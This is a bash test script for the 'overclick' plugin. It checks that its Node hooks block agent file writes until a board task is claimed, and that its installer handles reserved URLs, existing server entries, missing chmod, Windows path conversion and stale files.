test -z "$(printf '%s' "$matching_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/pre-create.mjs")"
mismatched_input='{"tool_input":{"type":"feature","harness":{"cli":"codex","model":"other-model","effort":"high"}}}'
pre_result=$(printf '%s' "$mismatched_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/pre-create.mjs")
printf '%s' "$pre_result" | grep -q '"decision":"block"'

has_claim 0
write_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"Write",tool_input:{file_path:"changed.txt",content:"fixture"}}')
test -z "$(printf '%s' "$write_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")"

sed -i.bak 's/enforce_claim=0/enforce_claim=1/' "$HOOK_CONFIG"
blocked_write=$(printf '%s' "$write_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")
printf '%s' "$blocked_write" | grep -Fq 'claima um card no board antes: task_claim {id}'

read_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"Bash",tool_input:{command:"git status --short"}}')
test -z "$(printf '%s' "$read_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")"
write_bash_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"Bash",tool_input:{command:"printf fixture > changed.txt"}}')
blocked_bash=$(printf '%s' "$write_bash_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")
printf '%s' "$blocked_bash" | grep -Fq 'claima um card no board antes: task_claim {id}'
# A write hidden behind a redirection the guard must not mistake for a discard.
commit_bash_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"Bash",tool_input:{command:"git commit -m fixture >/dev/null 2>&1"}}')
blocked_commit=$(printf '%s' "$commit_bash_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")
printf '%s' "$blocked_commit" | grep -Fq 'claima um card no board antes: task_claim {id}'

failed_claim_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"task_claim",tool_input:{task_id:"T-1"},tool_response:{isError:true,content:[{type:"text",text:"claim failed"}]}}')
printf '%s' "$failed_claim_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs"
test ! -e "$TEST_ROOT/project/.overclick/claim.json"

claim_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"mcp__overclick__task_claim",tool_input:{task_id:"T-1"},tool_response:{structuredContent:{task:{short_id:"T-1",status:"em_execucao"},attempt:{id:"attempt-fixture",started_at:"2026-08-19T12:00:00.000Z"}}}}')
printf '%s' "$claim_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs"
test -f "$TEST_ROOT/project/.overclick/claim.json"
test "$(file_mode "$TEST_ROOT/project/.overclick/claim.json")" -eq 600
jq -e '.task_id == "T-1" and .claimed_at == "2026-08-19T12:00:00.000Z" and .session_id == "session-fixture"' "$TEST_ROOT/project/.overclick/claim.json" >/dev/null
test -z "$(printf '%s' "$write_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")"
other_session_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"another-session",tool_name:"Write",tool_input:{file_path:"changed.txt",content:"fixture"}}')
blocked_other_session=$(printf '%s' "$other_session_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")
printf '%s' "$blocked_other_session" | grep -Fq 'claima um card no board antes: task_claim {id}'

deliver_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"mcp__overclick__task_deliver",tool_input:{task_id:"T-1"}}')
printf '%s' "$deliver_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs"
test ! -e "$TEST_ROOT/project/.overclick/claim.json"
blocked_after_deliver=$(printf '%s' "$write_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")
printf '%s' "$blocked_after_deliver" | grep -Fq 'claima um card no board antes: task_claim {id}'

has_claim 1
test -z "$(printf '%s' "$write_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs")"
has_claim 0

printf '%s' "$claim_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs"
release_input=$(jq -nc --arg cwd "$TEST_ROOT/project" '{cwd:$cwd,session_id:"session-fixture",tool_name:"task_release",tool_input:{task_id:"T-1"}}')
printf '%s' "$release_input" | PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/claim-guard.mjs"
test ! -e "$TEST_ROOT/project/.overclick/claim.json"

# The floor the port promises: an EMPTY PATH. The plugin invokes the hook as
# `node "<plugin root>/hooks/x.mjs"`, and past that node call there is nothing
# external left to find — no jq, no python3, no curl, no bash.
NODE_BIN=$(command -v node)
mkdir -p "$TEST_ROOT/project-bare"
bare_claim_input=$(jq -nc --arg cwd "$TEST_ROOT/project-bare" '{cwd:$cwd,session_id:"bare-session",tool_name:"task_claim",tool_input:{task_id:"T-2"},tool_response:{structuredContent:{task:{short_id:"T-2",status:"em_execucao"},attempt:{started_at:"2026-08-19T12:30:00.000Z"}}}}')
printf '%s' "$bare_claim_input" | PATH= OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$NODE_BIN" "$REPO_ROOT/plugin/hooks/claim-guard.mjs"
test -f "$TEST_ROOT/project-bare/.overclick/claim.json"
bare_write_input=$(jq -nc --arg cwd "$TEST_ROOT/project-bare" '{cwd:$cwd,session_id:"bare-session",tool_name:"Write",tool_input:{file_path:"changed.txt",content:"fixture"}}')
test -z "$(printf '%s' "$bare_write_input" | PATH= OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$NODE_BIN" "$REPO_ROOT/plugin/hooks/claim-guard.mjs")"
bare_deliver_input=$(jq -nc --arg cwd "$TEST_ROOT/project-bare" '{cwd:$cwd,session_id:"bare-session",tool_name:"task_deliver",tool_input:{task_id:"T-2"}}')
printf '%s' "$bare_deliver_input" | PATH= OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$NODE_BIN" "$REPO_ROOT/plugin/hooks/claim-guard.mjs"
test ! -e "$TEST_ROOT/project-bare/.overclick/claim.json"
has_claim 1
bare_snapshot=$(PATH= OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" "$NODE_BIN" "$REPO_ROOT/plugin/hooks/session-start.mjs")
printf '%s' "$bare_snapshot" | grep -q 'T-1'

mkdir -p "$TEST_ROOT/git/remote.git" "$TEST_ROOT/git/work"
git init --bare "$TEST_ROOT/git/remote.git" >/dev/null 2>&1
git -C "$TEST_ROOT/git/work" init >/dev/null 2>&1
git -C "$TEST_ROOT/git/work" config user.name fixture
git -C "$TEST_ROOT/git/work" config user.email fixture@invalid
touch "$TEST_ROOT/git/work/file"
git -C "$TEST_ROOT/git/work" add file
git -C "$TEST_ROOT/git/work" commit -m fixture >/dev/null 2>&1
git -C "$TEST_ROOT/git/work" remote add origin "$TEST_ROOT/git/remote.git"
git -C "$TEST_ROOT/git/work" push -u origin HEAD >/dev/null 2>&1
commit=$(git -C "$TEST_ROOT/git/work" rev-parse HEAD)
(cd "$TEST_ROOT/git/work" && printf '{"tool_input":{"evidence":[{"text":"commit %s"}]}}' "$commit" | node "$REPO_ROOT/plugin/hooks/post-deliver.mjs")
# Evidence with no commit id is refused with exit 2, which is what makes the
# hook a guard rather than a log line.
if (cd "$TEST_ROOT/git/work" && printf '{"tool_input":{"evidence":[{"text":"shipped it"}]}}' | node "$REPO_ROOT/plugin/hooks/post-deliver.mjs" 2>/dev/null); then
  echo "post-deliver accepted evidence without a commit id" >&2
  exit 1
fi

# OCL-114, the shape of the original failure: a run pointed at a reserved,
# unresolvable namespace baked that host into the agent configs and every agent
# that read them concluded the board was down. It has to be refused up front.
if PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/reserved-native.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-reserved" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$(printf '%s%s%s' 'https' '://' 'board.invalid')" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/reserved.out" 2>"$TEST_ROOT/reserved.err"; then
  echo "installer accepted an instance URL in a reserved namespace" >&2
  exit 1
fi
grep -Fq 'reserved namespace' "$TEST_ROOT/reserved.err"
test ! -e "$TEST_ROOT/home-reserved/.config/overclick/config"
test ! -e "$TEST_ROOT/reserved-native.log"

# A server already named `overclick` and pointing somewhere else is somebody's
# working board. Installing must not take the name over: no remove, no add.
PATH="$TEST_ROOT/bin:$PATH" \
OC_TEST_NATIVE_LOG="$TEST_ROOT/collision-native.log" \
OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
OC_TEST_EXISTING_MCP="$(printf '%s%s%s' 'https' '://' 'other-board.internal/mcp')" \
OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-collision" \
OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
OVERCLICK_TOKEN="fixture" \
OVERCLICK_CLIS="claude" \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/collision.out" 2>"$TEST_ROOT/collision.err"
grep -Fq 'left untouched' "$TEST_ROOT/collision.err"
test "$(grep -c '^claude:mcp:remove$' "$TEST_ROOT/collision-native.log" || true)" -eq 0
test "$(grep -c '^mcp-url:' "$TEST_ROOT/collision-native.log" || true)" -eq 0

# The same server pointing at THIS instance is just a credential refresh, so a
# re-run must still rewrite it rather than skip it.
PATH="$TEST_ROOT/bin:$PATH" \
OC_TEST_NATIVE_LOG="$TEST_ROOT/refresh-native.log" \
OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
OC_TEST_EXISTING_MCP="$FIXTURE_URL/mcp" \
OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-refresh" \
OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
OVERCLICK_TOKEN="fixture" \
OVERCLICK_CLIS="claude" \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/refresh.out" 2>"$TEST_ROOT/refresh.err"
grep -Fq "mcp-url:$FIXTURE_URL/mcp" "$TEST_ROOT/refresh-native.log"

# OCL-133 (1). MinGit on Windows is a bash with no coreutils behind it, so
# `chmod` is not there at all. Under `set -e` that aborted the run at the first
# mode-bit call - after the credentials had already been written, so the user
# got a non-zero exit AND a rewritten config. What has to hold is the whole
# install surviving, not one guarded line, so this is a full run on a PATH where
# chmod does not exist.
mkdir -p "$TEST_ROOT/nochmod"
for utility in bash env sh git grep sed awk tr cat cp rm rmdir mkdir mv ln touch \
  mktemp dirname basename head tail uname node python3 find sort wc; do
  target=$(command -v "$utility" 2>/dev/null) && ln -sf "$target" "$TEST_ROOT/nochmod/$utility"
done
if PATH="$TEST_ROOT/nochmod" command -v chmod >/dev/null 2>&1; then
  echo "the no-chmod fixture still resolves chmod" >&2
  exit 1
fi
if ! PATH="$TEST_ROOT/bin:$TEST_ROOT/nochmod" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/nochmod-native.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-nochmod" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude,codex,grok,kimi,agy" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/nochmod.out" 2>"$TEST_ROOT/nochmod.err"; then
  echo "installer aborted on a PATH without chmod" >&2
  sed -n '1,20p' "$TEST_ROOT/nochmod.err" >&2
  exit 1
fi
if grep -Eq 'chmod.*(not found|No such file)' "$TEST_ROOT/nochmod.err"; then
  echo "installer still shells out to an absent chmod" >&2
  exit 1
fi
test "$(grep -c '^token=' "$TEST_ROOT/home-nochmod/.config/overclick/config")" -eq 1
grep -Fq 'installation complete' "$TEST_ROOT/nochmod.out"
# Skipping the mode bits is a Windows concession, not a relaxation: where chmod
# exists it still runs, and the earlier POSIX runs above assert mode 600 on the
# private config and on the Antigravity credentials.
test "$(file_mode "$TEST_ROOT/home/.config/overclick/config")" -eq 600

# OCL-133 (2). A MinGit shell hands the installer the MSYS form of a path
# (`/c/Users/...`), and Claude Code on Windows resolves that literally: the
# `@/c/Users/.../OVERCLICK.md` line it wrote into CLAUDE.md pointed at nothing,
# so the plugin looked installed while its instructions stopped loading. The
# converter is extracted and driven directly, because the rewrite only happens
# under a Windows uname - which is also what keeps `/c/anything` on Linux alone.
awk '/^# >>> native_path/{f=1} f{print} /^# <<< native_path/{f=0}' \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/native_path.sh"
grep -q '^native_path()' "$TEST_ROOT/native_path.sh"
mkdir -p "$TEST_ROOT/winbin" "$TEST_ROOT/winbin-cygpath" "$TEST_ROOT/empty-bin"
cat >"$TEST_ROOT/winbin/uname" <<'SH'
#!/bin/sh
printf 'MINGW64_NT-10.0-26100\n'
SH
chmod +x "$TEST_ROOT/winbin/uname"
cp "$TEST_ROOT/winbin/uname" "$TEST_ROOT/winbin-cygpath/uname"
cat >"$TEST_ROOT/winbin-cygpath/cygpath" <<'SH'
#!/bin/sh
printf 'D:/from-cygpath'
SH
chmod +x "$TEST_ROOT/winbin-cygpath/cygpath"

native_path_of() {
  PATH="$1:$PATH" bash -c '. "$1"; native_path "$2"' bash "$TEST_ROOT/native_path.sh" "$2"
}
test "$(native_path_of "$TEST_ROOT/winbin" '/c/Users/LASCHUK/.config/overclick/plugin')" \
  = 'C:/Users/LASCHUK/.config/overclick/plugin'
test "$(native_path_of "$TEST_ROOT/winbin" '/d/tools')" = 'D:/tools'
# cygpath, when the shell has it, answers for mount points this script cannot know.
test "$(native_path_of "$TEST_ROOT/winbin-cygpath" '/c/Users/LASCHUK')" = 'D:/from-cygpath'
# On a POSIX host `/c/...` is an ordinary directory and nothing may touch it.
test "$(native_path_of "$TEST_ROOT/empty-bin" '/c/Users/LASCHUK')" = '/c/Users/LASCHUK'
test "$(native_path_of "$TEST_ROOT/empty-bin" "$TEST_ROOT/home")" = "$TEST_ROOT/home"

# OCL-133 (4). `cp -R` onto an existing directory only ever adds, so a file the
# previous release shipped and this one dropped survived every upgrade: the
# 0.2.4 shell hooks were still sitting beside the 0.2.5 `.mjs` ones in both the
# installed copy and the marketplace one. An installed tree has to be a faithful
# copy of the release, so anything the release does not have must not survive.
stale_copies="$TEST_ROOT/home/.config/overclick/plugin
$TEST_ROOT/home/.config/overclick/native-marketplace/plugin
$TEST_ROOT/home/.config/overclick/codex-marketplace/plugins/overclick
$TEST_ROOT/home/.config/overclick/antigravity/overclick"
printf '%s\n' "$stale_copies" | while IFS= read -r copy; do
  printf 'stale\n' >"$copy/hooks/session-start.sh"
done
run_installer
printf '%s\n' "$stale_copies" | while IFS= read -r copy; do
  if [ -e "$copy/hooks/session-start.sh" ]; then
    echo "$copy kept a file the release does not ship" >&2
    exit 1
  fi
  test -f "$copy/hooks/session-start.mjs" || { echo "$copy lost the release payload" >&2; exit 1; }
done
# `while` runs in a subshell, so its exit status is what says the loop passed.
test "$(printf '%s\n' "$stale_copies" | while IFS= read -r copy; do
  [ -e "$copy/hooks/session-start.sh" ] && echo bad
done)" = ""

echo "plugin package checks passed"
